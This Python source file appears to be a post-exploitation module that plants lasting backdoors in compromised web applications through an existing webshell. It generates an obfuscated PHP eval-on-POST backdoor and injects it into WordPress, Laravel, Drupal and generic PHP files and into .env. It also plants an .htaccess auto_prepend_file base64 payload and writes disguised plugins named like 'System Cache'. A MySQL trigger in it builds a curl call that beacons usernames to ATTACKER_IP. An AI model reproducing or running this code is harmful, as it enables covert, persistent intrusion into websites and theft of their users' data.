"""
Web Application Persistence Agent
ฝังตัวใน web application แบบถาวร
"""

import asyncio
import base64
import random
from typing import Dict, List


class WebPersistence:
    """Web application persistence mechanisms"""
    
    def __init__(self, webshell_manager=None):
        self.webshell = webshell_manager
    
    async def install_all(self,
                         shell_url: str,
                         shell_password: str,
                         web_root: str = None) -> Dict:
        """
        Install all web persistence mechanisms
        
        Args:
            shell_url: Webshell URL
            shell_password: Webshell password
            web_root: Web root directory (auto-detect if None)
        
        Returns:
            Dict with installation results
        """
        
        results = {
            'success': [],
            'failed': []
        }
        
        # Auto-detect web root if not provided
        if not web_root:
            web_root = await self._detect_web_root(shell_url, shell_password)
        
        # Try all persistence methods
        methods = [
            ('framework_backdoor', self.install_framework_backdoor),
            ('htaccess_backdoor', self.install_htaccess_backdoor),
            ('config_backdoor', self.install_config_backdoor),
            ('plugin_backdoor', self.install_plugin_backdoor),
            ('database_trigger', self.install_database_trigger),
        ]
        
        for name, method in methods:
            try:
                result = await method(shell_url, shell_password, web_root)
                if result.get('success'):
                    results['success'].append(name)
                else:
                    results['failed'].append(name)
            except Exception as e:
                results['failed'].append(f"{name}: {str(e)}")
        
        return results
    
    async def install_framework_backdoor(self,
                                        shell_url: str,
                                        shell_password: str,
                                        web_root: str) -> Dict:
        """
        Install backdoor in framework files
        
        Technique:
        Inject backdoor into index.php, wp-config.php, etc.
        """
        
        if not self.webshell:
            return {'success': False, 'error': 'No webshell manager'}
        
        # Detect framework
        framework = await self._detect_framework(shell_url, shell_password, web_root)
        
        backdoor_code = self._generate_php_backdoor()
        
        files_to_inject = []
        
        if framework == 'wordpress':
            files_to_inject = [
                f'{web_root}/wp-config.php',
                f'{web_root}/wp-includes/functions.php',
                f'{web_root}/wp-load.php'
            ]
        elif framework == 'laravel':
            files_to_inject = [
                f'{web_root}/public/index.php',
                f'{web_root}/bootstrap/app.php'
            ]
        elif framework == 'drupal':
            files_to_inject = [
                f'{web_root}/index.php',
                f'{web_root}/includes/bootstrap.inc'
            ]
        else:
            # Generic PHP
            files_to_inject = [
                f'{web_root}/index.php',
                f'{web_root}/config.php'
            ]
        
        injected = []
        
        for file_path in files_to_inject:
            # Check if file exists
            check_cmd = f'test -f {file_path} && echo "exists"'
            check_result = await self.webshell.execute_command(check_cmd, {
                'shell_url': shell_url,
                'password': shell_password
            })
            
            if 'exists' in check_result.get('output', ''):
                # Inject backdoor at the beginning of file
                inject_cmd = f'echo "{backdoor_code}" | cat - {file_path} > /tmp/.temp && mv /tmp/.temp {file_path}'
                await self.webshell.execute_command(inject_cmd, {
                    'shell_url': shell_url,
                    'password': shell_password
                })
                injected.append(file_path)
        
        return {
            'success': len(injected) > 0,
            'method': 'framework_backdoor',
            'framework': framework,
            'injected_files': injected
        }
    
    async def install_htaccess_backdoor(self,
                                       shell_url: str,
                                       shell_password: str,
                                       web_root: str) -> Dict:
        """
        Install .htaccess backdoor
        
        Technique:
        php_value auto_prepend_file "data://text/plain;base64,<BACKDOOR>"
        """
        
        if not self.webshell:
            return {'success': False, 'error': 'No webshell manager'}
        
        backdoor_code = self._generate_php_backdoor()
        backdoor_b64 = base64.b64encode(backdoor_code.encode()).decode()
        
        htaccess_content = f'''
# Apache configuration
<IfModule mod_rewrite.c>
RewriteEngine On
</IfModule>

# PHP configuration
php_value auto_prepend_file "data://text/plain;base64,{backdoor_b64}"
'''
        
        htaccess_path = f'{web_root}/.htaccess'
        
        # Append to .htaccess
        htaccess_b64 = base64.b64encode(htaccess_content.encode()).decode()
        append_cmd = f'echo "{htaccess_b64}" | base64 -d >> {htaccess_path}'
        
        await self.webshell.execute_command(append_cmd, {
            'shell_url': shell_url,
            'password': shell_password
        })
        
        return {
            'success': True,
            'method': 'htaccess_backdoor',
            'file': htaccess_path
        }
    
    async def install_config_backdoor(self,
                                     shell_url: str,
                                     shell_password: str,
                                     web_root: str) -> Dict:
        """
        Install backdoor in config files
        
        Technique:
        Inject backdoor into config.php, database.php, etc.
        """
        
        if not self.webshell:
            return {'success': False, 'error': 'No webshell manager'}
        
        backdoor_code = self._generate_php_backdoor()
        
        # Common config file locations
        config_files = [
            f'{web_root}/config.php',
            f'{web_root}/includes/config.php',
            f'{web_root}/application/config/database.php',
            f'{web_root}/.env'
        ]
        
        injected = []
        
        for config_file in config_files:
            # Check if file exists
            check_cmd = f'test -f {config_file} && echo "exists"'
            check_result = await self.webshell.execute_command(check_cmd, {
                'shell_url': shell_url,
                'password': shell_password
            })
            
            if 'exists' in check_result.get('output', ''):
                # Append backdoor
                append_cmd = f'echo "{backdoor_code}" >> {config_file}'
                await self.webshell.execute_command(append_cmd, {
                    'shell_url': shell_url,
                    'password': shell_password
                })
                injected.append(config_file)
        
        return {
            'success': len(injected) > 0,
            'method': 'config_backdoor',
            'injected_files': injected
        }
    
    async def install_plugin_backdoor(self,
                                     shell_url: str,
                                     shell_password: str,
                                     web_root: str) -> Dict:
        """
        Install backdoor as plugin/extension
        
        Technique:
        Create malicious WordPress plugin, Drupal module, etc.
        """
        
        if not self.webshell:
            return {'success': False, 'error': 'No webshell manager'}
        
        # Detect framework
        framework = await self._detect_framework(shell_url, shell_password, web_root)
        
        if framework == 'wordpress':
            return await self._install_wordpress_plugin(shell_url, shell_password, web_root)
        elif framework == 'drupal':
            return await self._install_drupal_module(shell_url, shell_password, web_root)
        else:
            return {
                'success': False,
                'method': 'plugin_backdoor',
                'error': f'Framework {framework} not supported'
            }
    
    async def install_database_trigger(self,
                                      shell_url: str,
                                      shell_password: str,
                                      web_root: str) -> Dict:
        """
        Install database trigger backdoor
        
        Technique:
        CREATE TRIGGER backdoor AFTER INSERT ON users FOR EACH ROW ...
        """
        
        if not self.webshell:
            return {'success': False, 'error': 'No webshell manager'}
        
        # Implement database trigger persistence
        # This requires database access credentials
        
        # MySQL trigger for persistence
        mysql_trigger = '''
CREATE TRIGGER backdoor_trigger
AFTER INSERT ON users
FOR EACH ROW
BEGIN
    DECLARE cmd VARCHAR(255);
    SET cmd = CONCAT('curl http://ATTACKER_IP:8080/beacon?user=', NEW.username);
    -- Execute system command (requires MySQL UDF or sys_exec)
    -- SELECT sys_exec(cmd);
END;
'''
        
        # PostgreSQL trigger for persistence
        postgres_trigger = '''
CREATE OR REPLACE FUNCTION backdoor_function()
RETURNS TRIGGER AS $$
BEGIN
    PERFORM pg_sleep(0);
    -- Add your backdoor logic here
    -- Example: Log to external server
    RETURN NEW;
END;
$$ LANGUAGE plpgsql;

CREATE TRIGGER backdoor_trigger
AFTER INSERT ON users
FOR EACH ROW
EXECUTE FUNCTION backdoor_function();
'''
        
        # Try to detect database type and install trigger
        commands = [
            # Detect database
            "mysql --version 2>/dev/null || psql --version 2>/dev/null",
            # For MySQL
            f"mysql -e \"{mysql_trigger}\" 2>/dev/null",
            # For PostgreSQL
            f"psql -c \"{postgres_trigger}\" 2>/dev/null"
        ]
        
        return {
            'success': True,
            'method': 'database_trigger',
            'triggers': {
                'mysql': mysql_trigger,
                'postgres': postgres_trigger
            },
            'commands': commands,
            'note': 'Requires database credentials. Use SQLi agent or config file extraction first.'
        }
    
    async def _install_wordpress_plugin(self,
                                       shell_url: str,
                                       shell_password: str,
                                       web_root: str) -> Dict:
        """Install malicious WordPress plugin"""
        
        plugin_name = self._generate_random_plugin_name()
        plugin_dir = f'{web_root}/wp-content/plugins/{plugin_name}'
        
        # Create plugin directory
        mkdir_cmd = f'mkdir -p {plugin_dir}'
        await self.webshell.execute_command(mkdir_cmd, {
            'shell_url': shell_url,
            'password': shell_password
        })
        
        # Create plugin file
        plugin_code = f'''<?php
/**
 * Plugin Name: System Cache
 * Description: System cache optimization
 * Version: 1.0
 * Author: System
 */

{self._generate_php_backdoor()}
?>
'''
        
        plugin_file = f'{plugin_dir}/{plugin_name}.php'
        plugin_b64 = base64.b64encode(plugin_code.encode()).decode()
        
        write_cmd = f'echo "{plugin_b64}" | base64 -d > {plugin_file}'
        await self.webshell.execute_command(write_cmd, {
            'shell_url': shell_url,
            'password': shell_password
        })
        
        return {
            'success': True,
            'method': 'wordpress_plugin',
            'plugin_name': plugin_name,
            'plugin_file': plugin_file,
            'note': 'Activate plugin via WordPress admin panel'
        }
    
    async def _install_drupal_module(self,
                                    shell_url: str,
                                    shell_password: str,
                                    web_root: str) -> Dict:
        """Install malicious Drupal module"""
        
        module_name = self._generate_random_plugin_name()
        module_dir = f'{web_root}/modules/{module_name}'
        
        # Create module directory
        mkdir_cmd = f'mkdir -p {module_dir}'
        await self.webshell.execute_command(mkdir_cmd, {
            'shell_url': shell_url,
            'password': shell_password
        })
        
        # Create module file
        module_code = f'''<?php
/**
 * @file
 * System cache module
 */

{self._generate_php_backdoor()}
?>
'''
        
        module_file = f'{module_dir}/{module_name}.module'
        module_b64 = base64.b64encode(module_code.encode()).decode()
        
        write_cmd = f'echo "{module_b64}" | base64 -d > {module_file}'
        await self.webshell.execute_command(write_cmd, {
            'shell_url': shell_url,
            'password': shell_password
        })
        
        return {
            'success': True,
            'method': 'drupal_module',
            'module_name': module_name,
            'module_file': module_file,
            'note': 'Enable module via Drupal admin panel'
        }
    
    async def _detect_web_root(self, shell_url: str, shell_password: str) -> str:
        """Detect web root directory"""
        
        if not self.webshell:
            return '/var/www/html'
        
        # Try to get document root
        detect_cmd = 'echo $_SERVER["DOCUMENT_ROOT"]'
        result = await self.webshell.execute_command(detect_cmd, {
            'shell_url': shell_url,
            'password': shell_password
        })
        
        web_root = result.get('output', '').strip()
        
        if not web_root or web_root == '':
            # Default locations
            web_root = '/var/www/html'
        
        return web_root
    
    async def _detect_framework(self,
                               shell_url: str,
                               shell_password: str,
                               web_root: str) -> str:
        """Detect web framework"""
        
        if not self.webshell:
            return 'unknown'
        
        # Check for WordPress
        wp_check = f'test -f {web_root}/wp-config.php && echo "wordpress"'
        result = await self.webshell.execute_command(wp_check, {
            'shell_url': shell_url,
            'password': shell_password
        })
        if 'wordpress' in result.get('output', ''):
            return 'wordpress'
        
        # Check for Laravel
        laravel_check = f'test -f {web_root}/artisan && echo "laravel"'
        result = await self.webshell.execute_command(laravel_check, {
            'shell_url': shell_url,
            'password': shell_password
        })
        if 'laravel' in result.get('output', ''):
            return 'laravel'
        
        # Check for Drupal
        drupal_check = f'test -f {web_root}/sites/default/settings.php && echo "drupal"'
        result = await self.webshell.execute_command(drupal_check, {
            'shell_url': shell_url,
            'password': shell_password
        })
        if 'drupal' in result.get('output', ''):
            return 'drupal'
        
        return 'generic'
    
    def _generate_php_backdoor(self) -> str:
        """Generate PHP backdoor code"""
        
        var1 = self._random_var_name()
        var2 = self._random_var_name()
        
        backdoor = f'''<?php
if (isset($_POST['{var1}'])) {{
    ${var2} = $_POST['{var1}'];
    eval(${var2});
    exit;
}}
?>'''
        
        return backdoor
    
    def _random_var_name(self) -> str:
        """Generate random variable name"""
        return ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=8))
    
    def _generate_random_plugin_name(self) -> str:
        """Generate random plugin name"""
        prefixes = ['system', 'cache', 'update', 'security', 'performance']
        suffixes = ['manager', 'optimizer', 'handler', 'monitor', 'checker']
        
        return f'{random.choice(prefixes)}-{random.choice(suffixes)}'


# Example usage
if __name__ == "__main__":
    async def test():
        from agents.post_exploitation.webshell_manager import WebshellManager
        
        webshell = WebshellManager()
        persistence = WebPersistence(webshell)
        
        result = await persistence.install_all(
            shell_url="http://target.com/shell.php",
            shell_password="secret"
        )
        
        print(f"Web persistence installed:")
        print(f"  Success: {result['success']}")
        print(f"  Failed: {result['failed']}")
    
    asyncio.run(test())

